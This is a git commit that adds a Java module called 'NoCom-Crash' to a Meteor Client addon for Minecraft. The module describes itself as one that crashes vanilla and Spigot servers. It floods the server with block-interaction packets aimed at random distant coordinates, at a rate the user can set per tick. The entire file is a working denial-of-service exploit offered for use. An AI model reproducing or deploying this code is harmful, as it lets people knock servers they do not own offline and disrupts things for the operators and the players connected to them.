368c04eaa8a0505ad3254c9be8d55f8b46fc1092
TaxEvasiqn <97795311+TaxEvasiqn@users.noreply.github.com>
2022-04-06 20:24:33 +0100

    added nocom crash

---
+++ src/main/java/widecat/meteorcrashaddon/modules/NoComCrash.java
@@ -0,0 +1,55 @@
+package widecat.meteorcrashaddon.modules;
+
+import widecat.meteorcrashaddon.CrashAddon;
+import meteordevelopment.meteorclient.events.world.TickEvent;
+import meteordevelopment.meteorclient.settings.SettingGroup;
+import meteordevelopment.meteorclient.settings.*;
+import meteordevelopment.meteorclient.systems.modules.Module;
+import meteordevelopment.orbit.EventHandler;
+import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
+import net.minecraft.util.Hand;
+import net.minecraft.util.hit.BlockHitResult;
+import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.math.Direction;
+import net.minecraft.util.math.Vec3d;
+import java.util.Objects;
+import java.util.Random;
+
+public class NoComCrash extends Module{
+    final Random      r       = new Random();
+    int i = 0;
+    Vec3d pickRandomPos() {
+        int x = this.r.nextInt(0xFFFFFF);
+        int y = 255;
+        int z = this.r.nextInt(0xFFFFFF);
+        return new Vec3d(x, y, z);
+    }
+    private final SettingGroup sgGeneral = settings.getDefaultGroup();
+    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
+        .name("amount")
+        .description("How many packets to send to the server per tick.")
+        .defaultValue(15)
+        .min(1)
+        .sliderMax(100)
+        .build()
+    );
+
+    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
+        .name("auto-disable")
+        .description("Disables module on kick.")
+        .defaultValue(true)
+        .build()
+    );
+
+    public NoComCrash() {
+        super(CrashAddon.CATEGORY, "NoCom-Crash", "Crashes vanilla and Spigot servers");
+    }
+
+    @EventHandler
+    private void onTick(TickEvent.Post event) {
+        for (int i = 0; i < amount.get(); i++) {
+            Vec3d cpos = pickRandomPos();
+            PlayerInteractBlockC2SPacket PACKET = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false));
+            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(PACKET);
+    }
+}}
